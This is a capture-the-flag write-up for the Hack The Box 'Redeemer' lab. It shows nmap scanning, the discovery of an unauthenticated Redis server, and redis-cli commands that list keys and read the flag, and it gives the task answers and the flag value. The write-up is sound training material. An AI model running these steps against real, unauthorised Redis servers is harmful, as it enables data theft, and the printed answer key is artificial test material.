# HTB Starting Point – Redeemer

Difficulty: Very Easy  
Date: 20/11/2025

---

## VPN Connection

The same `.ovpn` file stored in the `sf_shared` directory of the Kali Linux VM was used.  
The connection to the HTB VPN was started with:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon

Assigned IP: 10.10.14.2  
Target: 10.129.136.187

---

## Connectivity Check

ping -c 3 10.129.136.187  
PING 10.129.136.187 (10.129.136.187) 56(84) bytes of data.  
64 bytes from 10.129.136.187: icmp_seq=1 ttl=63 time=61.2 ms  
64 bytes from 10.129.136.187: icmp_seq=2 ttl=63 time=60.9 ms  
64 bytes from 10.129.136.187: icmp_seq=3 ttl=63 time=62.1 ms

--- 10.129.136.187 ping statistics ---  
3 packets transmitted, 3 received, 0% packet loss  
rtt min/avg/max/mdev = 60.919/61.385/62.075/0.497 ms

The target is reachable.

---

## Port Scanning

An initial Nmap version scan was executed:

nmap -sV 10.129.136.187  
All 1000 scanned TCP ports were closed.

No open ports were identified using the standard scan.

A full-range, high-rate scan was then performed:

nmap -p- -min-rate 5000 10.129.136.187  
PORT STATE SERVICE  
6379/tcp open redis

One open port was found: **6379/tcp (Redis)**.

---

## Verification Tasks

### Task 1 – Which TCP port is open on the machine?

Answer: 6379  
Status: Correct

---

### Task 2 – Which service is running on the open port?

Answer: Redis  
Status: Correct

---

### Task 3 – What type of database is Redis?

Answer: In-memory database  
Status: Correct

---

### Task 4 – CLI utility used to interact with Redis

Answer: redis-cli  
Status: Correct

---

### Task 5 – Flag used with redis-cli to specify the hostname

Answer: -h  
Status: Correct

---

### Task 6 – Command used to obtain server information and statistics

Answer: info  
Status: Correct

Evidence excerpt:

redis_version:5.0.7  
os:Linux 5.4.0-77-generic  
role:master  
db0:keys=4

---

### Task 7 – Redis version running on the target

Answer: 5.0.7  
Status: Correct

---

### Task 8 – Command used to select a Redis database

Answer: select  
Status: Correct

---

### Task 9 – How many keys are stored in database index 0?

Answer: 4  
Status: Correct

Evidence:

keys *  
numb  
temp  
stor  
flag

---

### Task 10 – Command used to retrieve all keys in a database

Answer: keys *  
Status: Correct

---

### Task 11 – Root Flag

The flag was retrieved by querying the key named "flag":

get flag  
"03e1d2b376c37ab3f5319922053953eb"

Flag: 03e1d2b376c37ab3f5319922053953eb  
Status: Correct

---

## Notes

This machine demonstrates the risks of exposing a Redis instance without authentication.  
An attacker can access all stored keys, including sensitive values, directly through redis-cli.

---

## Author

Report by delerico
